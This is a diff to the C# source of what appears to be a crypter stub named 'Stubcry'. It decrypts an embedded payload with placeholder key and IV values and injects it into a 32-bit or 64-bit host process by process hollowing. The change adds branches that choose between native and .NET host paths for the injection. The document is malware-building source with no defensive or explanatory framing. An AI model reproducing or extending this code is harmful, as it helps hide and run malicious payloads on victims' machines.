@@ -1,5 +1,4 @@
-﻿
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
@@ -24,15 +23,13 @@ using System.Windows.Forms;
 [assembly: Guid("#Guid")]
 [assembly: ComVisible(false)]
 
-
-
 namespace Stubcry
 {
 
 
     static class Program
     {
-        
+
         [StructLayout(LayoutKind.Explicit, Size = 104)]
         public struct StartupInfo
         {
@@ -334,11 +331,29 @@ namespace Stubcry
             }
             else if (config.isrunportal32 == true)
             {
-                NIKBINARY32bit.nik5ra(config.ipath, "", FOKFILE(magicalcode.Replace(",", "").Replace("'", ""), "$key", "$IV"));
+                if (config.isNative == true)
+                {
+                    NIKBINARY32bit.nik5ra(config.nativeipath, "", FOKFILE(magicalcode.Replace(",", "").Replace("'", ""), "$key", "$IV"));
+                }
+                else
+                {
+                    NIKBINARY32bit.nik5ra(config.dotnetipath, "", FOKFILE(magicalcode.Replace(",", "").Replace("'", ""), "$key", "$IV"));
+
+                }
+
+
             }
             else if (config.isrunportal64 == true)
             {
-                nIK64.openfile(FOKFILE(magicalcode.Replace(",", "").Replace("'", ""), "$key", "$IV"), config.ipath, "");
+                if (config.isNative == true)
+                {
+                    nIK64.openfile(FOKFILE(magicalcode.Replace(",", "").Replace("'", ""), "$key", "$IV"), config.nativeipath, "");
+                }
+                else
+                {
+                    nIK64.openfile(FOKFILE(magicalcode.Replace(",", "").Replace("'", ""), "$key", "$IV"), config.dotnetipath, "");
+
+                }
             }
 
             if (zebi.Length > 0)
